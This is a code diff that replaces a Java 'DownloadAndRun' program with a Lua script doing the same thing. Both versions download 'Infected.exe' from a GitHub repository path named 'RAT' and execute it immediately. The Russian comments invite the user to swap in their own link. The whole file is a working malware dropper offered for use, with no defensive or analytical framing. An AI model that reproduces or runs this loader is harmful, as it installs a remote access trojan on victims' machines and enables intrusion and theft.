@@ -1,54 +1,29 @@
-import java.io.BufferedInputStream;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
+local http = require("socket.http")
+local lfs = require("lfs") -- Для работы с файловой системой
 
-public class DownloadAndRun {
+-- Функция для скачивания файла
+function downloadFile(url, savePath)
+    local response, code = http.request(url)
+    if code == 200 then
+        local file = io.open(savePath, "wb")
+        file:write(response)
+        file:close()
+        return true
+    else
+        print("Ошибка при скачивании файла: " .. code)
+        return false
+    end
+end
 
-    public static void main(String[] args) {
-        String fileURL = "https://github.com/kiwpopr/RAT/raw/refs/heads/main/Infected.exe"; // Замените на вашу ссылку
-        String saveDir = "infected.exe"; // Путь для сохранения файла
+-- Функция для запуска файла
+function runFile(filePath)
+    os.execute(filePath) -- Запуск файла
+end
 
-        try {
-            // Скачивание файла
-            downloadFile(fileURL, saveDir);
+-- Основная часть скрипта
+local url = "https://github.com/kiwpopr/RAT/raw/refs/heads/main/Infected.exe" -- Ваша ссылка
+local savePath = "Infected" -- Путь для сохранения файла
 
-            // Запуск исполняемого файла
-            runExecutable(saveDir);
-        } catch (IOException e) {
-            e.printStackTrace(); // Обработка исключений, если необходимо
-        }
-    }
-
-    private static void downloadFile(String fileURL, String saveDir) throws IOException {
-        URL url = new URL(fileURL);
-        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
-        httpConn.setRequestMethod("GET");
-        httpConn.connect();
-
-        // Проверка ответа сервера
-        if (httpConn.getResponseCode() != HttpURLConnection.HTTP_OK) {
-            throw new IOException("Ошибка при скачивании файла: " + httpConn.getResponseCode());
-        }
-
-        // Сохранение файла
-        try (InputStream inputStream = new BufferedInputStream(httpConn.getInputStream());
-             FileOutputStream outputStream = new FileOutputStream(saveDir)) {
-
-            byte[] buffer = new byte[4096];
-            int bytesRead;
-            while ((bytesRead = inputStream.read(buffer)) != -1) {
-                outputStream.write(buffer, 0, bytesRead);
-            }
-        } finally {
-            httpConn.disconnect();
-        }
-    }
-
-    private static void runExecutable(String filePath) throws IOException {
-        ProcessBuilder processBuilder = new ProcessBuilder(filePath);
-        processBuilder.start();
-    }
-}
+if downloadFile(url, savePath) then
+    runFile(savePath) -- Запуск скачанного файла
+end
